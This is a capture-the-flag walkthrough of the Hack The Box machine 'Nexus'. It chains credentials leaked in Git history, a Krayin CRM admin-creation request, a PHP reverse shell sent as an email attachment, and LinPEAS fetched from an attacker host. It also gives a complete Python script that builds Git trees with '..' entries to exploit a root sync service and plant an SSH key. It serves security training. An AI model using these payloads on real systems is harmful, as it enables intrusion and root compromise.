# Hack The Box — Nexus

> **Difficulty:** Easy  
> **OS:** Linux  
> **IP:** `10.129.234.54`  
> **Domains:** `nexus.htb`, `git.nexus.htb`, `billing.nexus.htb`

## 1. Initial Recon

### Add the Host to `/etc/hosts`

First, add the target to `/etc/hosts`:

```bash
echo "10.129.234.54 nexus.htb" | sudo tee -a /etc/hosts
```

### Nmap

Run a full TCP port scan with default scripts and version detection:

```bash
nmap -sC -sV -p- --min-rate 1000 10.129.234.54
```

Results:

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
80/tcp open  http    nginx 1.24.0 (Ubuntu)
```

Only two ports are exposed:

- `22/tcp` — SSH
    
- `80/tcp` — HTTP
    

The HTTP title is:

```text
Nexus Energy Authority — Powering the Nation's Future
```

---

# 2. Web Enumeration

Visiting `http://nexus.htb` shows the Nexus Energy Authority website.

The site itself doesn't expose much functionality, but one interesting section reveals an email address:

```text
j.matthew@nexus.htb
```

This could potentially be useful for authentication later.

### Virtual Host Enumeration

Since the main site doesn't reveal much, enumerate virtual hosts with Gobuster:

```bash
gobuster vhost -u http://nexus.htb \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
--append-domain
```

The scan reveals two interesting virtual hosts:

```text
Found: git.nexus.htb Status: 200 Size: 14474
Found: billing.nexus.htb Status: 302 Size: 390 --> http://billing.nexus.htb/admin/login
```

Add both to `/etc/hosts`:

```bash
echo "10.129.234.54 git.nexus.htb billing.nexus.htb" | sudo tee -a /etc/hosts
```

---

# 3. Git Service — Gitea

Navigating to:

```text
http://git.nexus.htb
```

reveals a self-hosted **Gitea** instance.

Browsing the repositories shows an interesting repository owned by `admin`:

```text
krayin-docker-setup
```

The repository contains configuration files including:

```text
docker-compose.yml
.env
```

The `.env` file contains database configuration. The current version has an empty password:

```text
DB_USERNAME=krayin
DB_PASSWORD=
```

This is suspicious because sensitive credentials may have existed in an earlier commit.

## Git History

Clone the repository:

```bash
git clone http://git.nexus.htb/admin/krayin-docker-setup
cd krayin-docker-setup
```

Check the commit history:

```bash
git log --oneline
```

Output:

```text
9b817fa (HEAD -> main, origin/main, origin/HEAD) Upload files to "/"
1615c46 Upload files to "/"
```

Compare the two commits:

```bash
git diff 9b817fa 1615c46
```

The previous commit contains a database password that was removed from the current version:

```diff
 DB_PORT=3306
 DB_DATABASE=krayin
 DB_USERNAME=krayin
-DB_PASSWORD=
+DB_PASSWORD=<redacted>
 DB_PREFIX=
```

This gives us a valid credential to try against the other web application.

---

# 4. Billing Application

Navigate to:

```text
http://billing.nexus.htb
```

The application redirects to:

```text
/admin/login
```

The login page belongs to **Krayin CRM**.

We already discovered an email address on the main website:

```text
j.matthew@nexus.htb
```

Combining this email address with the database password recovered from the Git history gives us access to the Krayin dashboard.

> **Alternative authentication path**
> 
> This version of Krayin also exposes an administrator configuration endpoint that can be abused to create administrator credentials:
> 
> ```http
> POST /install/api/admin-config-setup
> Host: billing.nexus.htb
> X-Requested-With: XMLHttpRequest
> Content-Type: application/x-www-form-urlencoded
> 
> admin=indigo&email=indigo@evil.com&password=Password123
> ```
> 
> The resulting credentials can then be used to access the admin dashboard.

---

# 5. Initial Access — File Upload

Inside the Krayin dashboard, the **My Account** section allows an image to be uploaded.

A direct PHP reverse shell upload is blocked because the application expects an image file.

Rather than immediately attempting to bypass the image restriction, another interesting feature is the mail functionality.

## Malicious Email Attachment

The application allows users to compose emails with attachments.

A PHP reverse shell can be attached to an email.

After sending the message, inspecting the request/response reveals that the attachment is stored under a path similar to:

```text
/storage/email/2/
```

This is interesting because the uploaded file may be accessible directly through the web server.

Start a listener on the attacking machine:

```bash
nc -lvnp 1234
```

Then request the uploaded PHP file through the browser.

The PHP file executes and connects back to the listener.

We obtain a shell as:

```text
www-data
```

Verify:

```bash
whoami
```

Output:

```text
www-data
```

---

# 6. Enumeration as `www-data`

Now that we have command execution, begin enumerating the filesystem.

The `/home` directory contains users/directories including:

```text
git
jones
```

Access to these directories is restricted.

Next, inspect the Krayin installation:

```bash
cd /var/www/krayin
```

The application's `.env` file contains another database password.

This credential can be used to investigate the database, but nothing immediately useful is found.

Since the machine exposes SSH, try the recovered credential against the `jones` account:

```bash
ssh jones@10.129.234.54
```

The credentials work.

We now have an SSH session as:

```text
jones
```

The user flag is located in Jones' home directory.

---

# 7. Privilege Escalation Enumeration

Start with the usual privilege-escalation checks:

```bash
id
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/exports
ss -tuln
ps aux
cat /etc/crontabs
getcap -r / 2>/dev/null
```

Nothing immediately obvious stands out.

Transfer and run LinPEAS for additional enumeration.

On the attacking machine:

```bash
python3 -m http.server 8000
```

On the target:

```bash
cd /tmp
wget http://<ATTACKER_IP>:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas.out
```

Among the results is an interesting service:

```text
gitea-template-sync
```

---

# 8. Gitea Template Sync Service

Inspect the systemd service:

```bash
cat /etc/systemd/system/gitea-template-sync.service
```

We find:

```ini
[Unit]
Description=Sync Gitea templates
After=network-online.target

[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
TimeoutStartSec=50s
```

The important part is:

```ini
User=root
```

A Python script is executed as root:

```text
/etc/gitea/template-sync.py
```

Inspect the script:

```bash
cat /etc/gitea/template-sync.py
```

---

# 9. Understanding the Vulnerability

The script retrieves Gitea repositories marked as templates and processes their Git trees.

The important code is:

```python
result = subprocess.run(
    GIT + ['ls-tree', '-r', 'HEAD'],
    cwd=bare_path,
    capture_output=True, text=True, timeout=10
)
```

`git ls-tree -r HEAD` recursively lists the files contained in the repository.

The script then extracts the file path:

```python
parts = line.split('\t', 1)

if len(parts) != 2:
    continue

meta, filepath = parts
```

It subsequently constructs a destination path:

```python
target = os.path.join(stage_path, filepath)
```

and writes the Git blob to that location:

```python
with open(target, 'wb') as f:
    f.write(cat_result.stdout)
```

### The Problem

There is **no validation of `filepath`**.

In particular, the application does not prevent path traversal using:

```text
..
```

Therefore, if we can create a Git tree containing paths such as:

```text
../../../../root/.ssh/authorized_keys
```

the synchronization script will follow those `..` components.

Because the synchronization service runs as **root**, the file can potentially be written outside the intended staging directory.

---

# 10. Constructing the Malicious Git Tree

The desired tree structure is conceptually:

```text
indigo/
├── README.md
└── ..
    └── ..
        └── ..
            └── ..
                └── root
                    └── .ssh
                        └── authorized_keys
```

The key point is that Git itself stores directory names as tree entries.

The vulnerable Python script later interprets those names as filesystem paths.

This creates a mismatch between:

- Git's representation of the tree
    
- The filesystem's interpretation of `..`
    

The result is a path traversal primitive.

---

# 11. Create the Template Repository

Log into Gitea as `jones`.

Create a repository named:

```text
indigo
```

Mark the repository as a **Template Repository**.

The synchronization service specifically searches for repositories where:

```python
r.get('template', False)
```

is true.

---

# 12. Generate an SSH Key

On the target, generate a key pair:

```bash
cd /tmp
ssh-keygen -f ./mykey -N ''
```

This produces:

```text
/tmp/mykey
/tmp/mykey.pub
```

The public key will be placed into:

```text
/root/.ssh/authorized_keys
```

---

# 13. Clone the Repository

Clone the newly created repository:

```bash
git clone http://jones:'<PASSWORD>'@localhost:3000/jones/indigo.git
cd indigo
```

---

# 14. Build the Malicious Git Objects

The normal Git interface does not make it straightforward to create the required tree structure.

Instead, manually construct the Git objects.

The following script creates:

- a blob containing our SSH public key
    
- a `.ssh` tree
    
- an `authorized_keys` entry
    
- a `root` directory
    
- multiple `..` directory entries
    
- a final commit pointing to the malicious tree
    

```python
#!/usr/bin/env python3

import hashlib
import zlib
import os
import subprocess
import sys
import time


def write_obj(data, t):
    h = ("%s %d" % (t, len(data))).encode() + b"\x00"
    s = h + data

    sha = hashlib.sha1(s).hexdigest()

    d = os.path.join(".git", "objects", sha[:2])
    os.makedirs(d, exist_ok=True)

    p = os.path.join(d, sha[2:])

    if not os.path.exists(p):
        open(p, "wb").write(zlib.compress(s))

    return sha


def entry(mode, name, sha):
    return ("%s %s" % (mode, name)).encode() + b"\x00" + bytes.fromhex(sha)


if not os.path.isdir(".git"):
    print("Run inside git repo")
    sys.exit(1)


r = subprocess.run(
    ["cat", "/tmp/mykey.pub"],
    capture_output=True,
    text=True
)

if r.returncode != 0:
    print("ssh-keygen -f /tmp/mykey -N ''")
    sys.exit(1)

key = r.stdout.strip() + "\n"


blob = write_obj(key.encode(), "blob")
readme = write_obj(b"# Template\n", "blob")

ssh_t = write_obj(
    entry("100644", "authorized_keys", blob),
    "tree"
)

cur = write_obj(
    entry("40000", ".ssh", ssh_t),
    "tree"
)

fir = write_obj(
    entry("40000", "root", cur),
    "tree"
)

for i in range(4):
    fir = write_obj(
        entry("40000", "..", fir),
        "tree"
    )

root = write_obj(
    entry("100644", "README.md", readme) +
    entry("40000", "..", fir),
    "tree"
)

ts = int(time.time())

c = (
    "tree %s\n"
    "author x <x@x> %d +0000\n"
    "committer x <x@x> %d +0000\n"
    "\n"
    "init\n"
    % (root, ts, ts)
)

sha = write_obj(c.encode(), "commit")

os.makedirs(
    os.path.join(".git", "refs", "heads"),
    exist_ok=True
)

open(
    os.path.join(".git", "refs", "heads", "main"),
    "w"
).write(sha + "\n")

print("Done: " + sha)
```

Save it as:

```text
exploit.py
```

Run it from inside the cloned repository:

```bash
python3 exploit.py
```

Then force-push the malicious tree:

```bash
git push -u origin main --force
```

---

# 15. Trigger the Synchronization

The `gitea-template-sync` service periodically processes template repositories.

When it processes our malicious repository, the following happens:

1. The service runs as `root`.
    
2. It identifies `indigo` as a template.
    
3. It runs:
    

```bash
git ls-tree -r HEAD
```

4. It receives the malicious Git tree.
    
5. The tree contains `..` path components.
    
6. The Python script passes those paths directly to `os.path.join()`.
    
7. The resulting path escapes the intended staging directory.
    
8. The SSH public key is written to:
    

```text
/root/.ssh/authorized_keys
```

Conceptually, the vulnerable code turns:

```text
/home/git/template-staging/jones/indigo/../../../../root/.ssh/authorized_keys
```

into a path pointing to:

```text
/root/.ssh/authorized_keys
```

Because the process is running as root, it has permission to write the file.

---

# 16. Root Access

Once the public key has been written, use the corresponding private key:

```bash
chmod 600 /tmp/mykey
```

Then connect as root:

```bash
ssh -i /tmp/mykey root@10.129.234.54
```

Verify:

```bash
whoami
```

```text
root
```

The root flag is now accessible from `/root`.

---

# 17. Privilege Escalation — Root Cause

The privilege escalation is caused by an unsafe interaction between **Git tree paths** and **filesystem paths**.

The vulnerable sequence is:

```text
Attacker-controlled Git repository
             |
             v
       git ls-tree
             |
             v
      Malicious filepath
             |
             v
       os.path.join()
             |
             v
       Filesystem write
             |
             v
      Path traversal
             |
             v
        Root-owned file
```

The application assumes that paths returned by Git are safe to use as filesystem paths.

They aren't.

Git allows tree entries with names such as:

```text
..
```

The Python script then treats these entries as ordinary filesystem path components.

Because there is no canonicalization or validation such as:

```python
os.path.realpath()
```

followed by a check that the resulting path remains inside the intended directory, an attacker can escape:

```text
/home/git/template-staging/jones/indigo/
```

and write somewhere else.

Since the service runs as:

```text
root
```

the resulting arbitrary file write becomes a privilege-escalation vulnerability.

---

# 18. Key Takeaways

### Recon

- Full Nmap scan revealed only SSH and HTTP.
    
- Virtual host enumeration was essential.
    
- Two important subdomains were discovered:
    
    - `git.nexus.htb`
        
    - `billing.nexus.htb`
        

### Initial Access

- Sensitive credentials were recovered from **Git commit history**.
    
- Those credentials provided access to Krayin CRM.
    
- A malicious email attachment resulted in PHP code execution.
    
- This provided a shell as `www-data`.
    
- A credential found in the application environment allowed SSH access as `jones`.
    

### Privilege Escalation

The critical vulnerability was in:

```text
/etc/gitea/template-sync.py
```

The service:

```text
gitea-template-sync.service
```

runs the script as:

```text
root
```

The script processes attacker-controlled Git template repositories and writes their contents to the filesystem without preventing path traversal.

By constructing a malicious Git tree containing `..` entries, it was possible to escape the intended staging directory and write:

```text
/root/.ssh/authorized_keys
```

This ultimately provided root SSH access.

---

# Attack Chain

```text
nexus.htb
    |
    +-- git.nexus.htb
    |       |
    |       +-- Gitea
    |       |
    |       +-- Git history
    |              |
    |              +-- DB password
    |
    +-- billing.nexus.htb
    |       |
    |       +-- Krayin CRM
    |              |
    |              +-- Admin access
    |              |
    |              +-- Malicious email attachment
    |                     |
    |                     +-- PHP execution
    |                            |
    |                            +-- www-data
    |
    +-- /var/www/krayin/.env
           |
           +-- jones credentials
                  |
                  +-- SSH
                       |
                       +-- jones
                            |
                            +-- gitea-template-sync
                                   |
                                   +-- Runs as root
                                   |
                                   +-- Unsafe Git tree extraction
                                          |
                                          +-- Path traversal
                                                 |
                                                 +-- /root/.ssh/authorized_keys
                                                        |
                                                        +-- root
```

## Flags

```text
User: /home/jones/user.txt

Root: /root/root.txt
```